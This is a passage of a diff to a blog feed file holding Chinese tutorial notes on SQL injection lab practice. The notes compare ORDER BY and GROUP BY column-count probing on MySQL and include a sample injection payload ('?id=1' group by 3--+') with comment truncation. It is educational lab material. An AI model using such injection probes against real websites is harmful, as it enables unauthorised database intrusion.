+<li>兼容性好，MySQL5&#x2F;8 都能用，<strong>不受 ONLY_FULL_GROUP_BY 参数影响</strong></li>
+<li>报错信息直观，稳定，靶场通用</li>
+</ol>
+<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h6><ol>
+<li>必须能注释截断源码后面内容，否则语法断裂（Less23 无法使用）</li>
+</ol>
+<h5 id="2-GROUP-BY-探测列数（备选，现在不推荐）"><a href="#2-GROUP-BY-探测列数（备选，现在不推荐）" class="headerlink" title="2. GROUP BY 探测列数（备选，现在不推荐）"></a>2. GROUP BY 探测列数（备选，现在不推荐）</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p><code>GROUP BY N</code>：同样支持数字代表结果集第 N 列。</p>
+<ul>
+<li>N ≤ 总列数：正常执行</li>
+<li>N &gt; 总列数：报错 <code>Unknown column &#39;N&#39; in &#39;group statement&#39;</code></li>
+</ul>
+<h6 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h6><p>和 order by 写法几乎一样：<code>?id=1&#39; group by 3--+</code><br>注释截断尾部，让 group by 成为顶层子句。</p>
+<h6 id="致命缺点（重点）"><a href="#致命缺点（重点）" class="headerlink" title="致命缺点（重点）"></a>致命缺点（重点）</h6><ol>
+<li><p><strong>受 <code>ONLY_FULL_GROUP_BY</code> 影响极大</strong>（MySQL5.7、8.0 默认开启）</p>
+<p> 开启后，哪怕 N 是合法列号，也直接报分组语法错误，探测直接失效。</p>
+</li>
+<li><p>group by 会<strong>合并相同值的行</strong>，会改变返回结果行数，容易干扰页面回显。</p>
+</li>
+</ol>
+<h4 id="对比汇总表"><a href="#对比汇总表" class="headerlink" title="对比汇总表"></a>对比汇总表</h4><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>ORDER BY 探测</th>
+<th>GROUP BY 探测</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>探测原理</td>
+<td>按结果集第 N 列排序，列不存在则报错</td>
+<td>按结果集第 N 列分组，列不存在则报错</td>
+</tr>
+<tr>
+<td>高版本 MySQL (8.0)</td>
+<td>✅稳定可用</td>
+<td>❌极易被 ONLY_FULL_GROUP_BY 废掉</td>
+</tr>
+<tr>
+<td>对结果集影响</td>
+<td>只改变顺序，<strong>行数不变</strong></td>
+<td>合并重复行，<strong>改变行数</strong></td>
+</tr>
+<tr>
+<td>报错信息</td>
+<td><code>Unknown column ... in &#39;order clause&#39;</code></td>
+<td><code>Unknown column ... in &#39;group statement&#39;</code></td>
+</tr>
+<tr>
+<td>推荐程度</td>
+<td>⭐⭐⭐⭐⭐ 首选</td>
+<td>⭐ 仅旧版本 MySQL 备选</td>
+</tr>
+<tr>
+<td>使用前提</td>
+<td>都需要注释截断源码尾部，放到 WHERE 外面</td>
+<td>同左</td>
+</tr>
+</tbody></table>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       <categories>
         <category>技术</category>
         <category>基础漏洞</category>
